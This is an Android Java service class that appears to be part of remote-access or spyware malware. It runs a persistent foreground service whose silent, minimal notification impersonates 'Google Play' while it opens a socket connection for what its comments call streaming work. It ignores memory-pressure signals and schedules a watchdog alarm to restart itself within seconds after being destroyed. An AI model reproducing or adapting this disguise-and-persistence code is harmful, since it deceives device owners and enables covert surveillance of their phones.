package com.access.client;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ComponentCallbacks2;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import com.task.tusker.network.SocketManager;
import com.task.tusker.services.ServiceWatchdog;
import com.task.tusker.utils.ResourceGuard;

public class BackgroundService extends Service {

    private static final String TAG         = "BackgroundService";
    private static final String CHANNEL_ID  = "SystemSyncChannel";
    // Use ID 2 — DataSyncService owns ID 1. Two services from the same app must
    // never share a foreground notification ID (RemoteServiceException on API 29+).
    private static final int    NOTIF_ID    = 2;
    private SocketManager socketManager;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        // Use the typed overload on API 29+ to satisfy Android 14 foreground-type rules
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIF_ID, createNotification(),
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
            } else {
                startForeground(NOTIF_ID, createNotification());
            }
        } catch (Exception e) {
            Log.e(TAG, "startForeground failed: " + e.getMessage());
            try { startForeground(NOTIF_ID, createNotification()); }
            catch (Exception ignored) {}
        }
        // Ensure ResourceGuard is alive (DataSyncService may have started it already;
        // getInstance() is idempotent and just returns the existing singleton)
        ResourceGuard.getInstance(this);
        socketManager = SocketManager.getInstance(this);
        socketManager.connect();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    /**
     * Android memory-pressure callback.  We stay running regardless of the level —
     * ResourceGuard will throttle the heavy streaming work automatically.
     */
    @Override
    public void onTrimMemory(int level) {
        super.onTrimMemory(level);
        Log.w(TAG, "onTrimMemory(" + level + ") received — staying alive, load will be balanced");
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "System Sync",
                NotificationManager.IMPORTANCE_MIN
            );
            channel.setShowBadge(false);
            channel.setSound(null, null);
            channel.enableVibration(false);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Google Play")
            .setContentText("Keeping your apps up to date")
            .setSmallIcon(android.R.drawable.stat_sys_download_done)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .setOngoing(true)
            .build();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "Service destroyed — scheduling restart in 5 s");
        if (socketManager != null) {
            socketManager.disconnect();
        }
        // Belt-and-suspenders: START_STICKY will restart us, but schedule a short-fuse
        // alarm too so the service is back within 5 seconds even if the OS delays.
        ServiceWatchdog.scheduleWakeAlarm(this, ServiceWatchdog.RESTART_DELAY_MS);
    }
}
